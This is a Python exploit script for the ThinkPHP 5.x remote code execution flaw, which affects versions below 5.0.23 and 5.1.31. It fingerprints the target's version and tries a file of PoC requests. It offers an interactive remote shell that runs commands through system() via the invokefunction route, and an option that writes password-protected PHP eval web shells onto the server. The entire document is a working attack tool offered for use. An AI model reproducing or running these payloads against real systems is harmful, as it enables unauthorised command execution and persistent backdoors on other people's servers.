#ThinkPHP 5.x < v5.0.23,v5.1.31 Remote Code Execution
#v5.x below v5.0.23,v5.1.31 shell BY-ZYA
import requests
import re
import optparse
import time

def test_url(url,v):
    num = 0
    f = open("thinkphp_poc.txt")
    #url = input('Your taget name:(e.g.http://magic-mirro.com/thinkphp/public/index.php):')
    #url = "http://magic-mirro.com/thinkphp/public/index.php"
    r=requests.get(url + "?s=version_test")
    version = re.findall('V[0-9].[0-9].[0-9]{1,2}',r.text)
    if (version):
        print("Version detected："+ str(version))
    else:
        print('Version seems can not be detected!')
        exit()
    time.sleep(1)
    for exp in f:
        if(v):
            print ("[o]Trying poc: " + url + exp)
        try:
            r=requests.get(url + exp)
        except:
            continue
        exist = re.findall('HttpException ',r.text) or re.findall('System Error',r.text)
        #print(exist)
        #exist = re.findall('<br/>\\n(.*?)</p>',content)
        if (exist):
            if(v):
                print('[-]Failed\n')
            continue
        else:
            print("[+]Found:"+ url + exp + "\n[+]Seem Exist!\n")
            num=num+1
            print("[+]Response:\n"+r.text + '\n'+ '-'*200)
    print("[+++]Test Done!" + str(num) + " poc(s) seem can be use")
def getshell(url):
    #url = input('Your taget name:(e.g.http://magic-mirro.com/thinkphp/public/index.php):')
    while (True):
        cmd = input('\nShell by-zya$')
        exp = "?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php -r\'system(\""+ cmd +"\");'"
        r=requests.get(url + exp)
        print(r.text)
def upload(url,passwd):
    exp1 = '?s=index/\\think\\template\driver\\file/write&cacheFile=bak1.php&content=<?php @eval($_POST['+passwd+']);?>'
    exp2 = '?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=bak2.php&vars[1][]=<?php @eval($_POST['+passwd+']);?>'
    exp3 = '?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo \'<?php @eval($_POST['+passwd+']);?>\'>bak3.php'
    explist = [exp1,exp2,exp3]
    for exp in explist:
        if(v):
            print ("[o]Trying exp: " + url + exp)
        try:
            r=requests.get(url + exp)
        except:
            continue
        exist = re.findall('Permission denied ',r.text) or re.findall('\template\driver\file',r.text)
        #print(exist)
        #exist = re.findall('<br/>\\n(.*?)</p>',content)
        if (exist):
            if(v):
                print('[-]Failed\n')
            continue
        else:
            print("[+]Found:"+ url + exp + "\n[+]Seem Exist!\n")
            num=num+1
            print("[+]Response:\n"+r.text + '\n'+ '-'*200)
    print("[+++]Test Done!" + str(num) + " poc(s) seem can be use")
def main():
    parser = optparse.OptionParser("ThinkPHP 5.x RCE exp by ZYA\n useage %prog "+"-u <url>\n -h <help>")
    parser.add_option('-u', dest='u', type='string', help='Target URL')
    parser.add_option('-v', dest='v', action='store_true', help='Show trying url detail')
    parser.add_option('--shell', dest='shell', action='store_true', help='Prompt for an interactive operating system shell')
    parser.add_option('--upload', dest='upload', help='Prompt for an interactive operating system shell')
    #parser.add_option('--s2', dest='s2', type='string', help='specify string2')
    (options, args) = parser.parse_args()
    if options.shell == None and options.u != None:
        test_url(options.u,options.v);
        exit(0)
    elif options.shell != None and options.u != None:
        getshell(options.u)
    elif options.shell != None and options.u != None:
        upload(options.u,options.upload)
    else:
        print(parser.usage)
        exit(0)
if __name__ == '__main__':
    main()
